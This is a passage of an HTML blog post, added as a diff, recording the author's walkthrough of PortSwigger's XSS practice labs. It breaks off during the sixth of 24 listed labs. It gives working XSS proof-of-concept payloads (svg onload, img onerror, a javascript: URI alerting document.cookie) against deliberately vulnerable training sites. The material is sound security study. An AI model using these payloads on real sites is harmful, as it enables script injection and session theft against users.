@@ -1,0 +1,1193 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>Burp官方xss靶场记录 - 剑胆琴心</title><meta name="author" content="剑胆琴心">
+<meta name="author-link" content="http://shuai06.github.io">
+<meta name="description" content="剑胆琴心的技术博客" /><meta name="keywords" content='XSS, 靶场' /><meta itemprop="name" content="Burp官方xss靶场记录">
+<meta itemprop="description" content=""><meta itemprop="datePublished" content="2025-03-04T11:11:30+08:00" />
+<meta itemprop="dateModified" content="2025-03-08T07:13:00+00:00" />
+<meta itemprop="wordCount" content="5871"><meta itemprop="image" content="https://shuai06.github.io/logo.png"/>
+<meta itemprop="keywords" content="XSS,靶场," /><meta property="og:title" content="Burp官方xss靶场记录" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://shuai06.github.io/burp%E5%AE%98%E6%96%B9xss%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/" /><meta property="og:image" content="https://shuai06.github.io/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2025-03-04T11:11:30+08:00" />
+<meta property="article:modified_time" content="2025-03-08T07:13:00+00:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://shuai06.github.io/logo.png"/>
+
+<meta name="twitter:title" content="Burp官方xss靶场记录"/>
+<meta name="twitter:description" content=""/>
+<meta name="application-name" content="剑胆琴心">
+<meta name="apple-mobile-web-app-title" content="剑胆琴心"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://shuai06.github.io/burp%E5%AE%98%E6%96%B9xss%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/" /><link rel="prev" href="https://shuai06.github.io/js%E9%80%86%E5%90%91%E5%88%9D%E5%AD%A6%E7%AC%94%E8%AE%B0/" /><link rel="next" href="https://shuai06.github.io/burp%E5%AE%98%E6%96%B9ssrf%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "Burp官方xss靶场记录",
+    "inLanguage": "zh-CN",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/shuai06.github.io\/burp%E5%AE%98%E6%96%B9xss%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95\/"
+    },"image": [{
+              "@type": "ImageObject",
+              "url": "https:\/\/shuai06.github.io\/images\/Apple-Devices-Preview.jpg",
+              "width":  1842 ,
+              "height":  1036 
+            }],"genre": "posts","keywords": "XSS, 靶场","wordcount":  5871 ,
+    "url": "https:\/\/shuai06.github.io\/burp%E5%AE%98%E6%96%B9xss%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95\/","datePublished": "2025-03-04T11:11:30+08:00","dateModified": "2025-03-08T07:13:00+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+      "@type": "Organization",
+      "name": "剑胆琴心","logo": {
+          "@type": "ImageObject",
+          "url": "https:\/\/shuai06.github.io\/images\/avatar.png",
+          "width":  438 ,
+          "height":  438 
+        }},"author": {
+        "@type": "Person",
+        "name": "剑胆琴心"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="剑胆琴心"><img
+    class="lazyload logo"
+    src="/svg/loading.min.svg"
+    data-src="/images/avatar.png"
+    data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
+    data-sizes="auto"
+    alt="剑胆琴心"
+    title="剑胆琴心" width="438" height="438"/><span class="header-title-text">剑胆琴心</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 所有文章</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/friends/"
+                title="友情链接"
+                
+              ><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容 ..." id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li>
+      </ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="剑胆琴心"><img
+    class="lazyload logo"
+    src="/svg/loading.min.svg"
+    data-src="/images/avatar.png"
+    data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
+    data-sizes="auto"
+    alt="/images/avatar.png"
+    title="/images/avatar.png" width="438" height="438"/><span class="header-title-text">剑胆琴心</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容 ..." id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 所有文章</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/friends/"
+                  title="友情链接"
+                  
+                ><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li
+              class="menu-item text-center"
+            ><a
+                  class="menu-link"
+                  href="https://github.com/shuai06"
+                  title="GitHub"
+                  rel="noopener noreferrer" target="_blank"
+                ><i class='fa-brands fa-github fa-fw' aria-hidden='true'></i> </a></li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container" data-page-style="normal"><aside class="toc" id="toc-auto"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside>
+
+  <aside class="aside-custom">
+    </aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX">
+        <span>Burp官方xss靶场记录</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><a href="http://shuai06.github.io" title="作者"target="_blank" rel="external nofollow noopener noreferrer author" class="author"><img
+    class="lazyload avatar"
+    src="/svg/loading.min.svg"
+    data-src="/images/avatar.png"
+    data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
+    data-sizes="auto"
+    alt="剑胆琴心"
+    title="剑胆琴心" width="438" height="438"/>&nbsp;剑胆琴心</a></span>
+          <span class="post-category">收录于 <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 渗透测试</a></span></div>
+      <div class="post-meta-line"><span title=2025-03-04&#32;11:11:30><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-03-04">2025-03-04</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 5871 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 12 分钟</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#1reflected-xss-into-html-context-with-nothing-encodedhttpsportswiggernetweb-securitycross-site-scriptingreflectedlab-html-context-nothing-encoded">1.<a href="https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded">Reflected XSS into HTML context with nothing encoded</a></a></li>
+        <li><a href="#2stored-xss-into-html-context-with-nothing-encodedhttpsportswiggernetweb-securitycross-site-scriptingstoredlab-html-context-nothing-encoded">2.<a href="https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded">Stored XSS into HTML context with nothing encoded</a></a></li>
+        <li><a href="#3dom-xss-in-documentwrite-sink-using-source-locationsearchhttpsportswiggernetweb-securitycross-site-scriptingdom-basedlab-document-write-sink">3.<a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink">DOM XSS in <code>document.write</code> sink using source <code>location.search</code></a></a></li>
+        <li><a href="#4dom-xss-in-innerhtml-sink-using-source-locationsearchhttpsportswiggernetweb-securitycross-site-scriptingdom-basedlab-innerhtml-sink">4.<a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink">DOM XSS in <code>innerHTML</code> sink using source <code>location.search</code></a></a></li>
+        <li><a href="#5dom-xss-in-jquery-anchor-href-attribute-sink-using-locationsearch-sourcehttpsportswiggernetweb-securitycross-site-scriptingdom-basedlab-jquery-href-attribute-sink">5.<a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink">DOM XSS in jQuery anchor <code>href</code> attribute sink using <code>location.search</code> source</a></a></li>
+        <li><a href="#6dom-xss-in-jquery-selector-sink-using-a-hashchange-eventhttpsportswiggernetweb-securitycross-site-scriptingdom-basedlab-jquery-selector-hash-change-event">6.<a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event">DOM XSS in jQuery selector sink using a hashchange event</a></a></li>
+        <li><a href="#7reflected-xss-into-attribute-with-angle-brackets-html-encodedhttpsportswiggernetweb-securitycross-site-scriptingcontextslab-attribute-angle-brackets-html-encoded">7.<a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded">Reflected XSS into attribute with angle brackets HTML-encoded</a></a></li>
+        <li><a href="#8stored-xss-into-anchor-href-attribute-with-double-quotes-html-encodedhttpsportswiggernetweb-securitycross-site-scriptingcontextslab-href-attribute-double-quotes-html-encoded">8.<a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded">Stored XSS into anchor <code>href</code> attribute with double quotes HTML-encoded</a></a></li>
+        <li><a href="#9reflected-xss-into-a-javascript-string-with-angle-brackets-html-encodedhttpsportswiggernetweb-securitycross-site-scriptingcontextslab-javascript-string-angle-brackets-html-encoded">9.<a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded">Reflected XSS into a JavaScript string with angle brackets HTML encoded</a></a></li>
+        <li><a href="#10从url获取参数写到select元素内的dom型xss">10.从URL获取参数写到select元素内的DOM型XSS</a></li>
+        <li><a href="#11angularjs中尖括号和双引号编码的dom型xss">11.AngularJS中尖括号和双引号编码的DOM型XSS</a></li>
+        <li><a href="#12反射型-dom-xss">12.反射型 DOM XSS</a></li>
+        <li><a href="#13存储型dom-xss">13.存储型DOM XSS</a></li>
+        <li><a href="#14大部分html标签和属性被过滤的反射型xss">14.大部分HTML标签和属性被过滤的反射型XSS</a></li>
+        <li><a href="#15除了自定义标签外所有html标签都被过滤的反射型xss">15.除了自定义标签外所有HTML标签都被过滤的反射型XSS</a></li>
+        <li><a href="#16svg标签的反射型xss">16.SVG标签的反射型XSS</a></li>
+        <li><a href="#17规范链接标签中的反射型xss">17.规范链接标签中的反射型XSS</a></li>
+        <li><a href="#18javascript字符串中转义了单引号和反斜杠的反射型xss">18.JavaScript字符串中转义了单引号和反斜杠的反射型XSS</a></li>
+        <li><a href="#19javascript字符串中转义了单引号并对尖括号和双引号进行html编码的反射xss">19.JavaScript字符串中转义了单引号并对尖括号和双引号进行html编码的反射XSS</a></li>
+        <li><a href="#20对尖括号和双引号html编码及对单引号和反斜杠进行转义的存储型xss">20.对尖括号和双引号HTML编码及对单引号和反斜杠进行转义的存储型XSS</a></li>
+        <li><a href="#21对尖括号单双引号反斜杠和反引号进行模板文本unicode转义的反射xss">21.对尖括号，单双引号，反斜杠和反引号进行模板文本unicode转义的反射XSS</a></li>
+        <li><a href="#22利用xss来窃取cookies">22.利用XSS来窃取Cookies</a></li>
+        <li><a href="#23利用xss来窃取密码">23.利用XSS来窃取密码</a></li>
+        <li><a href="#24利用xss执行csrf">24.利用XSS执行CSRF</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><blockquote>
+<p>回炉一下</p>
+</blockquote>
+<h3 id="1reflected-xss-into-html-context-with-nothing-encodedhttpsportswiggernetweb-securitycross-site-scriptingreflectedlab-html-context-nothing-encoded">1.<a href="https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded"target="_blank" rel="external nofollow noopener noreferrer">Reflected XSS into HTML context with nothing encoded<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></h3>
+<p>将 XSS反射到HTML 上下文中，不进行任何编码</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306111028100.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306111028100.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306111028100.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306111028100.png 2x"
+    data-sizes="auto"
+    alt="image-20250306111028100"
+    title="image-20250306111028100"/></p>
+<p>尝试：</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306111236066.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306111236066.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306111236066.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306111236066.png 2x"
+    data-sizes="auto"
+    alt="image-20250306111236066"
+    title="image-20250306111236066"/></p>
+<p>将 XSS 反射到 HTML 上下文中，不进行任何编码 ：</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306111309444.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306111309444.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306111309444.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306111309444.png 2x"
+    data-sizes="auto"
+    alt="image-20250306111309444"
+    title="image-20250306111309444"/></p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306111327336.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306111327336.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306111327336.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306111327336.png 2x"
+    data-sizes="auto"
+    alt="image-20250306111327336"
+    title="image-20250306111327336"/></p>
+<h3 id="2stored-xss-into-html-context-with-nothing-encodedhttpsportswiggernetweb-securitycross-site-scriptingstoredlab-html-context-nothing-encoded">2.<a href="https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded"target="_blank" rel="external nofollow noopener noreferrer">Stored XSS into HTML context with nothing encoded<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></h3>
+<p>将 XSS 存储到 HTML 上下文中，未进行任何编码</p>
+<p>发表评论，再查看评论：</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306111539350.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306111539350.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306111539350.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306111539350.png 2x"
+    data-sizes="auto"
+    alt="image-20250306111539350"
+    title="image-20250306111539350"/></p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306111612045.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306111612045.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306111612045.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306111612045.png 2x"
+    data-sizes="auto"
+    alt="image-20250306111612045"
+    title="image-20250306111612045"/></p>
+<h3 id="3dom-xss-in-documentwrite-sink-using-source-locationsearchhttpsportswiggernetweb-securitycross-site-scriptingdom-basedlab-document-write-sink">3.<a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink"target="_blank" rel="external nofollow noopener noreferrer">DOM XSS in <code>document.write</code> sink using source <code>location.search</code><i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></h3>
+<p>document.write使用源在接收器中进行 DOM XSSlocation.search</p>
+<p>本实验包含搜索查询跟踪功能中的一个基于DOM的跨站点脚本漏洞。它使用JavaScript document.write函数，该函数将数据写入页面。使用来自location.search数据调用document.write函数，您可以使用网站URL控制该数据。</p>
+<p>1.搜索框中输入内容</p>
+<p>2.右键单击并检查该元素，并观察您的随机字符串已放置在img src属性内。</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306111938285.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306111938285.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306111938285.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306111938285.png 2x"
+    data-sizes="auto"
+    alt="image-20250306111938285"
+    title="image-20250306111938285"/></p>
+<p>使用payload闭合前面的img标签的src属性：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="err">&#34;</span><span class="o">&gt;&lt;</span><span class="nx">svg</span> <span class="nx">onload</span><span class="o">=</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306112043383.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306112043383.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306112043383.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306112043383.png 2x"
+    data-sizes="auto"
+    alt="image-20250306112043383"
+    title="image-20250306112043383"/></p>
+<h3 id="4dom-xss-in-innerhtml-sink-using-source-locationsearchhttpsportswiggernetweb-securitycross-site-scriptingdom-basedlab-innerhtml-sink">4.<a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink"target="_blank" rel="external nofollow noopener noreferrer">DOM XSS in <code>innerHTML</code> sink using source <code>location.search</code><i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></h3>
+<p>innerHTML使用源在接收器中进行 DOM XSSlocation.search</p>
+<p>本实验包含搜索博客功能中的一个基于DOM的跨站点脚本漏洞。它使用innerHTML赋值，该赋值使用location.search中的数据更改div元素的HTML内容。
+要解决此实验，请执行调用alert函数的跨站点脚本攻击。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="mi">1</span> <span class="nx">onerror</span><span class="o">=</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306112413118.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306112413118.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306112413118.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306112413118.png 2x"
+    data-sizes="auto"
+    alt="image-20250306112413118"
+    title="image-20250306112413118"/></p>
+<h3 id="5dom-xss-in-jquery-anchor-href-attribute-sink-using-locationsearch-sourcehttpsportswiggernetweb-securitycross-site-scriptingdom-basedlab-jquery-href-attribute-sink">5.<a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink"target="_blank" rel="external nofollow noopener noreferrer">DOM XSS in jQuery anchor <code>href</code> attribute sink using <code>location.search</code> source<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></h3>
+<p>用源的jQuery 锚点属性接收器中的DOM XSShreflocation.search</p>
+<p>本实验在提交反馈页面中包含一个基于DOM的跨站点脚本漏洞。它使用jQuery库的$ selector函数查找锚元素，并使用location.search中的数据更改其href属性。
+要解决此实验，请创建“返回”链接警报document. cookie。</p>
+<p>操作步骤：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">在提交反馈页面上，将查询参数更改returnPath为/后跟随机字母数字字符串。
+</span></span><span class="line"><span class="cl">右键单击并检查该元素，并观察您的随机字符串已放置在 ahref属性内。
+</span></span><span class="line"><span class="cl">改成returnPath：
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">javascript:alert(document.cookie)
+</span></span><span class="line"><span class="cl">按 Enter 键并单击“返回”
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306133303742.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306133303742.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306133303742.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306133303742.png 2x"
+    data-sizes="auto"
+    alt="image-20250306133303742"
+    title="image-20250306133303742"/></p>
+<p>使用伪协议，输入完payload后，点击返回</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306133452086.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306133452086.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306133452086.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306133452086.png 2x"
+    data-sizes="auto"
+    alt="image-20250306133452086"
+    title="image-20250306133452086"/></p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306133500308.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306133500308.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306133500308.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306133500308.png 2x"
+    data-sizes="auto"
+    alt="image-20250306133500308"
+    title="image-20250306133500308"/></p>
+<h3 id="6dom-xss-in-jquery-selector-sink-using-a-hashchange-eventhttpsportswiggernetweb-securitycross-site-scriptingdom-basedlab-jquery-selector-hash-change-event">6.<a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event"target="_blank" rel="external nofollow noopener noreferrer">DOM XSS in jQuery selector sink using a hashchange event<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></h3>
+<p>jQuery 选择器接收器中使用 hashchange 事件的 DOM XSS</p>
+<blockquote>
+<p>当URL的片段标识符更改时，将触发hashchange事件 (跟在＃符号后面的URL部分，包括＃符号)</p>
+</blockquote>
+<p>本实验在主页上包含一个基于DOM的跨站点脚本漏洞。它使用jQuery的$（）选择器函数来自动滚动到给定的帖子，其标题通过location.hash属性传递。
+要解决实验室问题，请向受害者发送一个漏洞，在其浏览器中调用print（）函数。</p>
+<p>查看源代码：</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306134522696.png"
